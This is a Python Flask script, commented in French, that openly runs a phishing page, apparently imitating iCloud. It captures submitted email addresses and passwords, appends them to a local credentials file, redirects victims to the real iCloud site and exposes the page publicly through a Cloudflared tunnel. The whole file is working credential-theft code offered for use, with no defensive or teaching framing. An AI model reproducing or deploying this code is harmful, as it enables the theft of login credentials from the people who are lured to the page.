import os
import subprocess
import time
from flask import Flask, request, render_template, redirect

# Codes de couleur ANSI
GREEN = "\033[32m"
CYAN = "\033[36m"
RED = "\033[31m"
RESET = "\033[0m"

app = Flask(__name__)

# Dossier pour stocker les informations capturées
if not os.path.exists("captured"):
    os.makedirs("captured")


# Page de phishing
@app.route("/")
def index():
    return render_template("index.html")


# Route pour capturer les informations
@app.route("/submit", methods=["POST"])
def submit():
    email = request.form.get("login_email")
    password = request.form.get("login_password")

    # Enregistrer les informations dans un fichier
    with open("captured/credentials.txt", "a") as f:
        f.write(f"Email: {email}, Password: {password}\n")

    # Rediriger l'utilisateur vers une page légitime
    return redirect("https://www.icloud.com/")


# Démarrer Cloudflared pour obtenir un lien public
def start_cloudflared():
    # Chemin vers Cloudflared (standard sous Linux)
    cloudflared_path = "/usr/local/bin/cloudflared"

    if not os.path.exists(cloudflared_path):
        print(f"{RED}[!] Cloudflared n'est pas installé. Veuillez l'installer.{RESET}")
        exit(1)

    print(f"{GREEN}[+] Démarrage de Cloudflared...{RESET}")
    cloudflared_process = subprocess.Popen(
        [cloudflared_path, 'tunnel', '--url', 'http://localhost:8080'],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
    )

    # Attendre que Cloudflared génère le lien
    time.sleep(5)
    for line in cloudflared_process.stderr:
        if "trycloudflare.com" in line:
            public_url = line.strip().split()[-1]
            print(f"{GREEN}[+] Lien public Cloudflared : {CYAN}{public_url}{RESET}")
            return public_url

    print(f"{RED}[!] Impossible d'obtenir le lien public Cloudflared.{RESET}")
    exit(1)


# Démarrer le serveur Flask
def start_flask():
    print(f"{GREEN}[+] Démarrage du serveur Flask...{RESET}")
    app.run(host="0.0.0.0", port=8080, debug=False)  # Désactiver le mode debug pour éviter les redémarrages


# Fonction principale
def main():
    # Démarrer Cloudflared et obtenir le lien public
    public_url = start_cloudflared()

    # Afficher le lien public
    print(f"{GREEN}[+] Votre page de phishing est accessible à l'adresse : {CYAN}{public_url}{RESET}")

    # Démarrer le serveur Flask
    start_flask()


if __name__ == "__main__":
    # Démarrer Cloudflared une seule fois
    if os.environ.get("WERKZEUG_RUN_MAIN") != "true":
        main()